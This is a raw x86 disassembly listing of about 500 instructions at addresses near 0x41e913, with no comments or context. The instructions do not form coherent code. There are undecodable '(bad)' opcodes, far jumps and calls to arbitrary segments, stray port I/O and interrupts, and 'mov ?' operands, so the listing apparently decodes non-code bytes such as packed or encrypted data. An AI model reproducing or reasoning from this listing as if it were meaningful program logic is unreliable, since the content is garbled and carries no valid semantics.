  41e913:	fbld   TBYTE PTR [ebx+0x2627ab5e]
  41e919:	test   eax,0x7836ff6
  41e91e:	sub    al,BYTE PTR [ebp+0x42abc457]
  41e924:	push   ecx
  41e925:	bound  esp,QWORD PTR [ecx+0x3b]
  41e928:	and    al,0x34
  41e92a:	jge    0x41e998
  41e92c:	xchg   ah,bl
  41e92e:	push   esi
  41e92f:	mov    eax,ds:0x93f1605
  41e934:	fsubp  st(7),st
  41e936:	push   ss
  41e937:	call   0xce08437e
  41e93c:	pop    eax
  41e93d:	out    dx,eax
  41e93e:	adc    al,0xcf
  41e940:	sub    eax,0xa31c3e1c
  41e945:	jnp    0x41e8e7
  41e947:	mov    DWORD PTR [edi-0x72],ecx
  41e94a:	loope  0x41e945
  41e94c:	ins    BYTE PTR es:[edi],dx
  41e94d:	fst    DWORD PTR [ebx]
  41e950:	scas   al,BYTE PTR es:[edi]
  41e951:	sub    BYTE PTR [ebx+edi*8+0xfadd8bf],dh
  41e958:	mov    ah,0x33
  41e95a:	pop    esi
  41e95b:	mov    ds:0x5704fae8,eax
  41e960:	sbb    dl,BYTE PTR [eax+edx*1+0x78119b7d]
  41e967:	dec    bp
  41e969:	aas    
  41e96a:	aad    0x3d
  41e96c:	pop    es
  41e96d:	leave  
  41e96e:	pop    ds
  41e96f:	inc    edi
  41e970:	retf   
  41e971:	ds ja  0x41e8ff
  41e974:	sahf   
  41e975:	pop    ebp
  41e976:	popa   
  41e977:	ror    BYTE PTR [ecx-0x5b],1
  41e97a:	xor    esi,eax
  41e97c:	mov    ebp,0xa1df5921
  41e981:	js     0x41e951
  41e983:	rcr    DWORD PTR [edi+0x10],1
  41e986:	es xchg edx,eax
  41e988:	jmp    0x787b:0xb7d2680f
  41e98f:	es ja  0x41ea07
  41e992:	cmp    eax,ebx
  41e994:	mov    dl,0xa5
  41e996:	ret    
  41e997:	icebp  
  41e998:	xchg   esp,eax
  41e999:	xor    esp,DWORD PTR [edi-0x2b]
  41e99c:	pop    ss
  41e99d:	sbb    bh,cl
  41e99f:	push   ecx
  41e9a0:	sbb    al,0xc7
  41e9a2:	fdiv   st(7),st
  41e9a4:	sub    BYTE PTR ds:0xf8f7b5d4,cl
  41e9aa:	mov    edx,esi
  41e9ac:	sbb    cl,BYTE PTR [ebx-0x9]
  41e9af:	repnz repnz dec edx
  41e9b2:	jmp    FWORD PTR [eax+eiz*1-0x5b66d3d3]
  41e9b9:	jnp    0x41e9c5
  41e9bb:	leave  
  41e9bc:	nop
  41e9bd:	add    esi,DWORD PTR [eax-0x9]
  41e9c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9c1:	xor    BYTE PTR [ebx+0x2],dl
  41e9c4:	xor    ecx,DWORD PTR [esi+0x48]
  41e9c7:	ins    DWORD PTR es:[edi],dx
  41e9c8:	push   ds
  41e9c9:	out    0x6f,al
  41e9cb:	mov    ebx,0xcabeebf
  41e9d0:	xlat   BYTE PTR ds:[ebx]
  41e9d1:	out    0x26,eax
  41e9d3:	pop    ebp
  41e9d4:	call   0x83e2d94a
  41e9d9:	lock pop esp
  41e9db:	lock jl 0x41ea45
  41e9de:	inc    esi
  41e9df:	rcr    esp,cl
  41e9e1:	inc    eax
  41e9e2:	sub    esi,esi
  41e9e4:	mov    eax,0xcefe68c1
  41e9e9:	test   BYTE PTR cs:[edi],dl
  41e9ec:	mov    dl,0x69
  41e9ee:	fidiv  WORD PTR [esi+eax*8+0x75]
  41e9f2:	mov    eax,0x1e9f672f
  41e9f7:	jmp    0x41e9ad
  41e9f9:	mov    edx,0xe63bffbb
  41e9fe:	test   DWORD PTR [ebx+ebx*2],ebp
  41ea01:	xor    ebx,DWORD PTR [ecx]
  41ea03:	dec    eax
  41ea04:	pop    edx
  41ea05:	xchg   ebx,eax
  41ea06:	xchg   ebp,eax
  41ea07:	nop
  41ea08:	imul   ecx,DWORD PTR [esi-0x1f33c512],0xfffffff9
  41ea0f:	das    
  41ea10:	js     0x41ea6b
  41ea12:	pop    edi
  41ea13:	sbb    al,0x47
  41ea15:	cs jmp 0xd269:0xab9abd10
  41ea1d:	fistp  WORD PTR [ebp-0x2f8211b6]
  41ea23:	adc    BYTE PTR [edi],0xa5
  41ea26:	cmp    al,0x79
  41ea28:	cdq    
  41ea29:	sbb    al,0x7f
  41ea2b:	rcr    ecx,0x2a
  41ea2e:	or     al,0x37
  41ea30:	icebp  
  41ea31:	pop    edx
  41ea32:	mov    esi,0x9e75c97b
  41ea37:	jmp    0x7435de4a
  41ea3c:	loope  0x41ea9a
  41ea3e:	jo     0x41e9ce
  41ea40:	push   ebx
  41ea41:	xlat   BYTE PTR ds:[ebx]
  41ea42:	jns    0x41ea2f
  41ea44:	mov    BYTE PTR [esi+ebp*2],ah
  41ea47:	(bad)  
  41ea48:	xchg   edi,eax
  41ea49:	ja     0x41ea4f
  41ea4b:	dec    esi
  41ea4c:	mov    edi,0x728ebd39
  41ea51:	jno    0x41eaa0
  41ea53:	sbb    al,0x9f
  41ea55:	repz imul DWORD PTR ds:0xe8a4ae3d
  41ea5c:	push   es
  41ea5d:	jle    0x41eade
  41ea5f:	int    0x44
  41ea61:	push   edi
  41ea62:	xchg   BYTE PTR ds:0x4362cbde,dl
  41ea68:	sbb    edi,DWORD PTR [esi+0x7f]
  41ea6b:	adc    edx,ebx
  41ea6d:	(bad)  
  41ea6e:	call   0xb4f5:0xef3c1d52
  41ea75:	mov    esi,0xf22c4e70
  41ea7a:	push   cs
  41ea7b:	into   
  41ea7c:	leave  
  41ea7d:	jo     0x41eabc
  41ea7f:	or     BYTE PTR [esi+eiz*1-0x691b8609],0x5b
  41ea87:	sbb    al,0x2c
  41ea89:	and    eax,0xf81b2fff
  41ea8e:	sbb    eax,0xbbc03c1c
  41ea93:	rcr    BYTE PTR [ecx],cl
  41ea95:	cmp    bl,cl
  41ea97:	repnz cmp edx,DWORD PTR [eax+0x32cb85f4]
  41ea9e:	bound  ebx,QWORD PTR [edx]
  41eaa0:	pop    eax
  41eaa1:	jo     0x41ea6b
  41eaa3:	mov    esp,0x3f127118
  41eaa8:	clc    
  41eaa9:	sub    eax,0xd5016c86
  41eaae:	ret    0x4d36
  41eab1:	mov    esp,0x77f5d218
  41eab6:	pop    edx
  41eab7:	sub    DWORD PTR [esi],ebx
  41eab9:	leave  
  41eaba:	pop    ebp
  41eabb:	dec    DWORD PTR [esi+0x27378276]
  41eac1:	adc    edi,eax
  41eac3:	shr    DWORD PTR [edx+0x22248529],1
  41eac9:	lock hlt 
  41eacb:	inc    ecx
  41eacc:	and    DWORD PTR [ebp-0x4a8029ef],0x7
  41ead3:	mov    dh,0x2e
  41ead5:	aam    0xb2
  41ead7:	iret   
  41ead8:	cld    
  41ead9:	inc    eax
  41eada:	mov    bl,0xd8
  41eadc:	inc    eax
  41eadd:	adc    BYTE PTR [ebp+ecx*8-0x65],dl
  41eae1:	mov    eax,0x14ef4f4c
  41eae6:	adc    al,0xa8
  41eae8:	mov    edi,0xdc652700
  41eaed:	retf   0xf66b
  41eaf0:	stos   DWORD PTR es:[edi],eax
  41eaf1:	in     eax,0x51
  41eaf3:	aaa    
  41eaf4:	dec    ebx
  41eaf5:	mov    bh,0x16
  41eaf7:	jge    0x41eab8
  41eaf9:	icebp  
  41eafa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eafb:	and    DWORD PTR [ecx+ecx*4+0x3c5dff73],eax
  41eb02:	loope  0x41eb00
  41eb04:	and    eax,DWORD PTR [ebx+0x79]
  41eb07:	sbb    eax,0xbf852465
  41eb0c:	or     ch,BYTE PTR [edi+0x4f13640d]
  41eb12:	lods   eax,DWORD PTR ds:[esi]
  41eb13:	ret    
  41eb14:	fnstsw WORD PTR [ebx]
  41eb16:	mov    eax,0x76e316ce
  41eb1b:	imul   ebp,DWORD PTR [ebp+0x56],0xffffffbd
  41eb1f:	lods   eax,DWORD PTR ds:[esi]
  41eb20:	outs   dx,DWORD PTR ds:[esi]
  41eb21:	mov    al,0xa2
  41eb23:	cmc    
  41eb24:	mov    DWORD PTR [eax],ebp
  41eb26:	and    al,0x35
  41eb28:	sub    DWORD PTR [edi+0x38fc9ab7],ebx
  41eb2e:	ja     0x41eaf4
  41eb30:	cld    
  41eb31:	mov    eax,0x4ba8c44f
  41eb36:	loopne 0x41eb78
  41eb38:	jmp    0x41eb05
  41eb3a:	addr16 (bad) 
  41eb3c:	sbb    eax,0x132a7
  41eb41:	test   DWORD PTR [ebx],0xd7520752
  41eb47:	js     0x41eb05
  41eb49:	cmc    
  41eb4a:	xchg   ebp,eax
  41eb4b:	cs xchg ebp,eax
  41eb4d:	and    DWORD PTR [eax],esi
  41eb4f:	ds loopne 0x41ebbb
  41eb52:	push   eax
  41eb53:	test   BYTE PTR [eax-0x7c],bl
  41eb56:	push   eax
  41eb57:	inc    edi
  41eb58:	pop    edi
  41eb59:	in     eax,0xac
  41eb5b:	jle    0x41eb65
  41eb5d:	adc    BYTE PTR [edx],ch
  41eb5f:	pop    ecx
  41eb60:	int3   
  41eb61:	xchg   bh,dh
  41eb63:	arpl   WORD PTR [ebp+0x77],dx
  41eb66:	test   BYTE PTR [edi-0xe],bh
  41eb69:	(bad)  
  41eb6a:	in     al,dx
  41eb6b:	push   ecx
  41eb6c:	ins    DWORD PTR es:[edi],dx
  41eb6d:	gs mov cl,0x84
  41eb70:	sub    DWORD PTR ds:0x56b4765c,ebp
  41eb76:	dec    ecx
  41eb77:	add    al,0x9c
  41eb79:	mov    ebx,ebx
  41eb7b:	jecxz  0x41ebd7
  41eb7d:	ret    0x35a7
  41eb80:	call   0x6e8f6081
  41eb85:	xor    esi,DWORD PTR [edi-0x63]
  41eb88:	mov    al,ds:0x3a4fc448
  41eb8d:	sbb    BYTE PTR [edx],0x44
  41eb90:	mov    bh,0x1f
  41eb92:	pushf  
  41eb93:	es push es
  41eb95:	int    0x4
  41eb97:	outs   dx,BYTE PTR ds:[esi]
  41eb98:	repnz (bad) 
  41eb9a:	repz xchg edi,eax
  41eb9c:	jle    0x41eb2d
  41eb9e:	arpl   sp,di
  41eba0:	and    edi,DWORD PTR [esi+0x47287a93]
  41eba6:	in     eax,dx
  41eba7:	mov    gs,WORD PTR ds:0x78d15188
  41ebad:	adc    al,0x4f
  41ebaf:	mov    edx,0x51666475
  41ebb4:	cdq    
  41ebb5:	aaa    
  41ebb6:	popa   
  41ebb7:	push   ebx
  41ebb8:	repnz push ss
  41ebba:	mov    ?,WORD PTR [esi+edi*4]
  41ebbd:	sbb    ax,0x8c64
  41ebc1:	(bad)  
  41ebc2:	cli    
  41ebc3:	arpl   WORD PTR [esi-0x5b],cx
  41ebc6:	jmp    0x523f:0xc65acbab
  41ebcd:	xchg   esi,eax
  41ebce:	mov    esp,0x700445b5
  41ebd3:	dec    cl
  41ebd5:	sub    dh,BYTE PTR [ecx+edi*1-0x25]
  41ebd9:	add    DWORD PTR [edi+0x798701bb],ebx
  41ebdf:	inc    ebx
  41ebe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebe1:	fsub   DWORD PTR [ecx+0x515887c8]
  41ebe7:	pop    ss
  41ebe8:	sub    DWORD PTR [edx],ebx
  41ebea:	repnz inc DWORD PTR [esi+0x22]
  41ebee:	push   esp
  41ebef:	je     0x41ec67
  41ebf1:	jb     0x41ebdb
  41ebf3:	or     eax,0x172b4ec7
  41ebf8:	add    eax,0xb6c9a94a
  41ebfd:	repz jmp 0xc5ac:0x6da27f67
  41ec05:	xchg   esi,eax
  41ec06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec07:	and    al,0xa2
  41ec09:	push   ebp
  41ec0a:	rcr    DWORD PTR [esi-0x55],0xd2
  41ec0e:	shl    dh,1
  41ec10:	out    dx,eax
  41ec11:	scas   al,BYTE PTR es:[edi]
  41ec12:	outs   dx,DWORD PTR ds:[esi]
  41ec13:	and    eax,0x174b6612
  41ec18:	jo     0x41ec6f
  41ec1a:	popa   
  41ec1b:	push   ss
  41ec1c:	ja     0x41ec70
  41ec1e:	outs   dx,DWORD PTR ds:[esi]
  41ec1f:	ins    BYTE PTR es:[edi],dx
  41ec20:	adc    ebp,eax
  41ec22:	std    
  41ec23:	adc    al,0xe0
  41ec25:	add    DWORD PTR [esi],0x9b83e29d
  41ec2b:	ficom  DWORD PTR [ebp+0x4ab7360f]
  41ec31:	pop    ebp
  41ec32:	lea    eax,[edx-0x24]
  41ec35:	mov    ds:0x9561dc2e,al
  41ec3a:	hlt    
  41ec3b:	mov    esp,0x3aa0321f
  41ec40:	loope  0x41ebe7
  41ec42:	pop    ebp
  41ec43:	pop    edi
  41ec44:	add    al,0xf6
  41ec46:	jl     0x41ebdb
  41ec48:	add    al,BYTE PTR [esi]
  41ec4a:	pop    ebx
  41ec4b:	test   eax,0xa006f7e7
  41ec50:	ret    0xfec5
  41ec53:	pop    ss
  41ec54:	push   cs
  41ec55:	sub    al,0x53
  41ec57:	loopne 0x41ec3b
  41ec59:	dec    esi
  41ec5a:	xchg   esp,eax
  41ec5b:	mov    ?,WORD PTR [eax]
  41ec5d:	mov    ebp,0x35ac2991
  41ec62:	jle    0x41ecd1
  41ec64:	shl    DWORD PTR [ecx+0x31],0x72
  41ec68:	imul   esp,DWORD PTR [edx+0x1b],0x88a90d43
  41ec6f:	fwait
  41ec70:	cmp    eax,0x96c43a6c
  41ec75:	adc    DWORD PTR [edx-0x661f7d87],0x144ace8b
  41ec7f:	adc    al,0xa7
  41ec81:	fwait
  41ec82:	dec    ecx
  41ec83:	dec    ebx
  41ec84:	sub    eax,0x4843ed86
  41ec89:	cld    
  41ec8a:	fst    st(3)
  41ec8c:	add    eax,0xa8c0c83f
  41ec91:	loope  0x41ec24
  41ec93:	or     esi,DWORD PTR [edx-0x73]
  41ec96:	fcmovnu st,st(5)
  41ec98:	push   esi
  41ec99:	arpl   WORD PTR [ebp+0x50d76f27],si
  41ec9f:	xchg   edi,eax
  41eca0:	jp     0x41ecaa
  41eca2:	add    BYTE PTR [edx-0x60],ch
  41eca5:	jmp    0x6ee3:0x42c13077
  41ecac:	xor    al,0xe0
  41ecae:	mov    esp,es
  41ecb0:	xchg   ecx,eax
  41ecb1:	fadd   QWORD PTR [ecx-0x45c73f70]
  41ecb7:	pop    es
  41ecb8:	in     eax,0x7e
  41ecba:	lahf   
  41ecbb:	test   eax,0x82f4edd1
  41ecc0:	mov    al,0x4f
  41ecc2:	pop    esp
  41ecc3:	xchg   dh,dl
  41ecc5:	fdivr  QWORD PTR [edi-0x3b]
  41ecc8:	ja     0x41eca4
  41ecca:	and    edx,DWORD PTR [ecx-0x1b0f98ae]
  41ecd0:	mov    cl,0x3f
  41ecd2:	sbb    bh,BYTE PTR [esi+0x23]
  41ecd5:	and    al,BYTE PTR [edi+0x38]
  41ecd8:	jg     0x41ed33
  41ecda:	int    0x84
  41ecdc:	push   edx
  41ecdd:	ins    DWORD PTR es:[edi],dx
  41ecde:	ret    0x53f9
  41ece1:	pushf  
  41ece2:	aas    
  41ece3:	pop    edi
  41ece4:	add    esi,0x3d95452c
  41ecea:	sub    ch,ah
  41ecec:	ja     0x41ecd2
  41ecee:	pop    es
  41ecef:	or     bh,bl
  41ecf1:	and    BYTE PTR [ebx+0x54],al
  41ecf4:	pop    ebx
  41ecf5:	adc    edx,DWORD PTR [edi+0x66]
  41ecf8:	out    0x54,al
  41ecfa:	test   al,0x4e
  41ecfc:	mov    ah,0xa6
  41ecfe:	pop    edi
  41ecff:	cld    
  41ed00:	mov    edi,0x1eb237cd
  41ed05:	mov    al,ds:0x573612c
  41ed0a:	mov    al,0xee
  41ed0c:	js     0x41ed81
  41ed0e:	sub    dh,BYTE PTR [edx+0x7c]
  41ed11:	popa   
  41ed12:	sub    DWORD PTR [ebx+edx*4+0x2198b8c0],ebp
  41ed19:	xor    al,0x4a
  41ed1b:	pop    edi
  41ed1c:	(bad)  
  41ed1d:	adc    BYTE PTR [edi+0x2e80ca42],al
  41ed23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed25:	xchg   esi,eax
  41ed26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed27:	cdq    
  41ed28:	pop    ebp
  41ed29:	fnsave [ebp-0x722540fd]
  41ed2f:	pop    ebp
  41ed30:	add    bl,0xdd
  41ed33:	jae    0x41ecff
  41ed35:	stc    
  41ed36:	fld    DWORD PTR [si]
  41ed39:	pushf  
  41ed3a:	shl    BYTE PTR [ebx+0x38057a76],1
  41ed40:	cld    
  41ed41:	retw   
  41ed43:	jp     0x41ed8d
  41ed45:	pop    DWORD PTR [esi+eax*8+0x67fa71ca]
  41ed4c:	xor    DWORD PTR [ecx-0x2f],ebp
  41ed4f:	test   eax,0x60817559
  41ed54:	mov    dl,0x33
  41ed56:	hlt    
  41ed57:	pop    ebx
  41ed58:	mov    edi,DWORD PTR [esp+ebp*1-0x609da239]
  41ed5f:	es fsubrp st(7),st
  41ed62:	hlt    
  41ed63:	mov    ch,0x7b
  41ed65:	out    0xfe,al
  41ed67:	dec    esi
  41ed68:	test   al,0x89
  41ed6a:	popa   
  41ed6b:	jecxz  0x41ed83
  41ed6d:	int    0xc2
  41ed6f:	call   0x5e2909f4
  41ed74:	xchg   ebx,eax
  41ed75:	mov    DWORD PTR [ebp+0x6e50cd6c],esp
  41ed7b:	lods   eax,DWORD PTR ds:[esi]
  41ed7c:	sub    cl,BYTE PTR [ebx+0x1218b1cf]
  41ed82:	stc    
  41ed83:	cmp    DWORD PTR ds:0xcd6c1aa4,edx
  41ed89:	add    eax,0x968c71d0
  41ed8f:	adc    al,0x56
  41ed91:	cld    
  41ed92:	aam    0x68
  41ed94:	stos   BYTE PTR es:[edi],al
  41ed95:	in     al,0xd6
  41ed97:	inc    ecx
  41ed98:	xchg   ebp,eax
  41ed99:	arpl   WORD PTR [ebx],dx
  41ed9b:	mov    ebp,0x36d06d39
  41eda0:	or     DWORD PTR [eax+0x679d7e8e],ebp
  41eda6:	(bad)  
  41eda7:	lahf   
  41eda8:	scas   eax,DWORD PTR es:[edi]
  41eda9:	mov    eax,DWORD PTR [edi+0x735bc43]
  41edaf:	dec    ebx
  41edb0:	loop   0x41ee12
  41edb2:	jae    0x41ed83
  41edb4:	jmp    0xfdb7:0x9d163089
  41edbb:	or     al,0x52
  41edbd:	shl    BYTE PTR [ebx-0x7bf7ea48],1
  41edc3:	cwde   
  41edc4:	stos   BYTE PTR es:[edi],al
  41edc5:	test   al,0x73
  41edc7:	inc    ebp
  41edc8:	int    0x95
  41edca:	mov    es,WORD PTR [edi]
  41edcc:	xor    edx,DWORD PTR [ebx]
  41edce:	dec    eax
  41edcf:	(bad)  
  41edd0:	test   al,0x39
  41edd2:	sub    al,0xe7
  41edd4:	and    DWORD PTR [edx-0x53],ebp
  41edd7:	mov    edi,eax
  41edd9:	scas   al,BYTE PTR es:[edi]
  41edda:	repz ja 0x41edfc
  41eddd:	ja     0x41ee1b
  41eddf:	sub    edi,edi
  41ede1:	mov    cl,0xe3
  41ede3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ede4:	(bad)  
  41ede5:	push   edi
  41ede6:	(bad)  
  41ede7:	outs   dx,DWORD PTR ds:[esi]
  41ede8:	and    eax,DWORD PTR [eax]
  41edea:	push   edx
  41edeb:	shl    esi,1
  41eded:	dec    esi
  41edee:	add    ebp,DWORD PTR [ebx+0x7a83c876]
  41edf4:	or     eax,0xd8c0a8af
  41edf9:	push   cs
  41edfa:	ds stos DWORD PTR es:[edi],eax
  41edfc:	int    0x7e
  41edfe:	aas    
  41edff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee00:	inc    ebp
  41ee01:	fiadd  DWORD PTR [ebp+0x40172752]
  41ee07:	mov    bl,0xe1
  41ee09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee0a:	xor    ebx,DWORD PTR [ebx]
  41ee0c:	pop    edi
  41ee0d:	(bad)  
  41ee0e:	nop
  41ee0f:	adc    BYTE PTR ds:0xd398b0ab,0xe1
  41ee16:	leave  
  41ee17:	jmp    0x12cb4abc
  41ee1c:	ss sbb al,0x86
  41ee1f:	jmp    0x41edef
  41ee21:	cmp    cl,BYTE PTR [ebx+0x5c]
  41ee24:	inc    DWORD PTR [edx+eax*1-0x3d087a06]
  41ee2b:	jns    0x41ee58
  41ee2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee2e:	dec    esp
  41ee2f:	int    0x7
  41ee31:	dec    esp
  41ee32:	test   DWORD PTR [edx],edx
  41ee34:	(bad)
  41ee38:	mov    ds:0x2d5ac312,al
  41ee3d:	out    0x27,eax
  41ee3f:	fmul   QWORD PTR [eax+0x65]
  41ee42:	lods   al,BYTE PTR ds:[esi]
  41ee43:	les    ebx,FWORD PTR [ecx-0x3d]
  41ee46:	retf   0x3a50
  41ee49:	mov    edx,0x97282c5f
  41ee4e:	out    dx,al
  41ee4f:	xchg   ecx,eax
  41ee50:	ss fwait
  41ee52:	sbb    BYTE PTR [ecx],0x7d
  41ee55:	mov    cl,0xb6
  41ee57:	pop    ebp
  41ee58:	mov    esi,0x583eb6ea
  41ee5d:	jmp    0x24eab4ed
  41ee62:	add    BYTE PTR [ebp-0x1bdc67ba],dl
  41ee68:	(bad)  
  41ee69:	adc    DWORD PTR [edx+0x0],edx
  41ee6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee6d:	cs jle 0x41ee24
  41ee70:	pop    ss
  41ee71:	in     al,dx
  41ee72:	leave  
  41ee73:	xor    al,0xcb
  41ee75:	sti    
  41ee76:	fiadd  WORD PTR [ebp-0xd658e97]
  41ee7c:	lock sti 
  41ee7e:	mov    fs,WORD PTR [ebp-0xf666edf]
  41ee84:	das    
  41ee85:	inc    eax
  41ee86:	or     al,0x77
  41ee88:	lods   eax,DWORD PTR ds:[esi]
  41ee89:	scas   eax,DWORD PTR es:[edi]
  41ee8a:	fst    st(7)
  41ee8c:	xchg   ecx,eax
  41ee8d:	push   esp
  41ee8e:	popf   
  41ee8f:	mov    al,ah
  41ee91:	dec    ebp
  41ee92:	into   
  41ee93:	inc    ebx
  41ee94:	adc    ebp,DWORD PTR [esi]
  41ee96:	clc    
  41ee97:	in     al,0xb3
  41ee99:	jmp    0x41ef05
  41ee9b:	or     eax,0x28fe0ea3
  41eea0:	pop    eax
  41eea1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eea2:	push   es
  41eea3:	cld    
  41eea4:	dec    esi
  41eea5:	cmp    bh,ah
  41eea7:	push   ecx
  41eea8:	das    
  41eea9:	ret    
  41eeaa:	dec    esi
  41eeab:	mov    ds:0x7dea262c,al
  41eeb0:	(bad)  
  41eeb1:	ficomp DWORD PTR [eax+0x37]
  41eeb4:	mov    ds:0x71da84a9,al
  41eeb9:	pop    ds
  41eeba:	call   0x846cd289
  41eebf:	test   eax,0x2b377fcb
  41eec4:	mul    BYTE PTR [eiz*4+0x7c611fb7]
  41eecb:	inc    edx
  41eecc:	push   edi
  41eecd:	adc    eax,0x65641d10
  41eed2:	jmp    0xf37:0xba558bb7
  41eed9:	rcl    DWORD PTR [eax+0x2aea0570],0xb6
  41eee0:	inc    edx
  41eee1:	lock sub ecx,DWORD PTR [ebx]
  41eee4:	push   ebp
  41eee5:	dec    ebp
  41eee6:	ror    BYTE PTR [esi],cl
  41eee8:	xchg   esp,eax
  41eee9:	and    eax,DWORD PTR ds:0x2120a3bf
  41eeef:	and    esi,DWORD PTR [ebp-0x3a]
  41eef2:	mov    DWORD PTR [edi-0x2],ebp
  41eef5:	xor    DWORD PTR [esi-0x4aeff773],0x83d2ab78
  41eeff:	popf   
  41ef00:	cld    
  41ef01:	arpl   WORD PTR [esi+ebx*8-0x1a6767b],ax
  41ef08:	adc    dh,bl
  41ef0a:	xchg   ebp,eax
  41ef0b:	jne    0x41ee9d
  41ef0d:	mov    edx,0xafeaad9a
  41ef12:	xchg   edi,eax
  41ef13:	dec    ebp
  41ef14:	jl     0x41eece
  41ef16:	retf   
  41ef17:	ins    BYTE PTR es:[edi],dx
  41ef18:	inc    eax
  41ef19:	lods   al,BYTE PTR ds:[esi]
  41ef1a:	dec    edi
  41ef1b:	mov    esp,0x523abefc
  41ef20:	cld    
  41ef21:	lds    edi,FWORD PTR [ebx+0x7750e89f]
  41ef27:	(bad)  
  41ef28:	icebp  
  41ef29:	push   0x6755475c
  41ef2e:	xchg   ecx,eax
  41ef2f:	mov    edx,0x1c59ea54
  41ef34:	mov    esi,0xaf8a5448
  41ef39:	fcmovnb st,st(3)
  41ef3b:	out    0x9f,eax
  41ef3d:	lods   al,BYTE PTR ds:[esi]
  41ef3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef3f:	pop    ebp
  41ef40:	pop    ds
  41ef41:	jecxz  0x41ef18
  41ef43:	dec    cx
  41ef45:	sub    DWORD PTR [eax+eiz*2+0x4351c938],eax
  41ef4c:	push   ebp
  41ef4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef4e:	popf   
  41ef4f:	and    eax,0xa9abd81
  41ef54:	or     edi,esi
  41ef56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef57:	and    BYTE PTR [edx+0x4c],bh
  41ef5a:	sti    
  41ef5b:	out    0xb,al
  41ef5d:	mov    al,0x6d
  41ef5f:	jle    0x41ef28
  41ef61:	nop
  41ef62:	pop    edx
  41ef63:	jmp    0xe525:0xd7250e88
  41ef6a:	data16 out 0x6b,al
  41ef6d:	daa    
  41ef6e:	repz sbb bl,BYTE PTR [ebx+0xacaef3]
  41ef75:	add    cl,bh
  41ef77:	mov    eax,0xd9ebe7cd
  41ef7c:	pop    ds
  41ef7d:	call   0x32cb:0x2490f736
  41ef84:	je     0x41efcf
  41ef86:	fidivr DWORD PTR [edx+0x36174bca]
  41ef8c:	call   0x1bc2:0xc5bf5f78
  41ef93:	push   eax
  41ef94:	ret    
  41ef95:	inc    ebp
  41ef96:	sar    BYTE PTR [edi+0x29],0x5e
  41ef9a:	leave  
  41ef9b:	dec    ecx
  41ef9c:	rcl    DWORD PTR [eax],0x98
  41ef9f:	jo     0x41ef35
  41efa1:	cmp    eax,0xadfefaa7
  41efa6:	xchg   ebx,eax
  41efa7:	nop
  41efa8:	mov    eax,?
  41efaa:	xchg   ebx,eax
  41efab:	xchg   al,bh
  41efad:	popf   
  41efae:	cwde   
  41efaf:	or     eax,0x31b509e
  41efb4:	mov    ch,0xb5
  41efb6:	inc    eax
  41efb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efb8:	out    0x43,al
  41efba:	cdq    
  41efbb:	inc    ecx
  41efbc:	adc    al,BYTE PTR [ecx]
  41efbe:	ins    BYTE PTR es:[edi],dx
  41efbf:	dec    ebx
  41efc0:	push   cs
  41efc1:	mov    dh,0xd3
  41efc3:	fsub   QWORD PTR [esp+ebp*2+0x79]
  41efc7:	aad    0xb4
  41efc9:	scas   eax,DWORD PTR es:[edi]
  41efca:	rcr    DWORD PTR [edx+ebx*2-0x242aea48],0xeb
  41efd2:	cmp    eax,esi
  41efd4:	mov    fs,WORD PTR [esi-0x2a3e7bb2]
  41efda:	cmp    BYTE PTR [edi-0xa],dl
  41efdd:	fild   WORD PTR [esp+esi*8-0x12]
  41efe1:	loop   0x41efd5
  41efe3:	push   edx
  41efe4:	dec    edi
  41efe5:	outs   dx,BYTE PTR ds:[esi]
  41efe6:	push   edi
  41efe7:	sbb    DWORD PTR [ecx+0x6d3afbc8],0xf3420a63
  41eff1:	dec    ebx
  41eff2:	pop    edx
  41eff3:	lock push 0x1f9a167e
  41eff9:	icebp  
  41effa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41effb:	or     DWORD PTR [ebp+ebp*4+0xb],esi
  41efff:	or     BYTE PTR [esi],dl
  41f001:	fld    DWORD PTR [edi]
  41f003:	push   ebx
  41f004:	dec    esi
  41f005:	jp     0x41efb3
  41f007:	mov    esi,0x62fd8169
  41f00c:	mov    eax,ds:0x739df5c2
  41f011:	adc    cl,bl
  41f013:	sbb    ch,bl
  41f015:	pop    ds
  41f016:	lods   al,BYTE PTR ds:[esi]
  41f017:	xchg   BYTE PTR [ebp+0x680e7bc0],ah
  41f01d:	push   es
  41f01e:	daa    
  41f01f:	push   ebx
  41f020:	jecxz  0x41effa
  41f022:	retf   0xbb7e
  41f025:	sub    DWORD PTR [ecx],eax
  41f027:	adc    eax,0x65fcd18e
  41f02c:	push   esi
  41f02d:	mov    al,0x71
  41f02f:	xor    DWORD PTR [ebp+0x40],esi
  41f032:	lea    esp,[ebp-0x3e3d93f2]
  41f038:	sbb    BYTE PTR [ebx+0x751116a1],ch
  41f03e:	adc    al,0xbf
  41f040:	mov    BYTE PTR [ecx],dl
  41f042:	mov    bh,BYTE PTR [ebx+0x9247026]
  41f048:	add    cl,BYTE PTR [ecx]
  41f04a:	xor    eax,0x1100bb63
  41f04f:	dec    ecx
  41f050:	popf   
  41f051:	adc    BYTE PTR [ecx],dh
  41f053:	les    eax,FWORD PTR [edx-0x52]
  41f056:	lods   eax,DWORD PTR ds:[esi]
  41f057:	mov    dl,0xe0
  41f059:	out    0xce,eax
  41f05b:	jbe    0x41f05d
  41f05d:	lds    ecx,FWORD PTR [ebp+0x313eaf80]
  41f063:	cmp    DWORD PTR [ebp-0x29],ebx
  41f066:	test   eax,0xae799845
  41f06b:	inc    eax
  41f06c:	pop    ebx
  41f06d:	icebp  
  41f06e:	or     ebp,0xea76ef9f
  41f074:	pop    ds
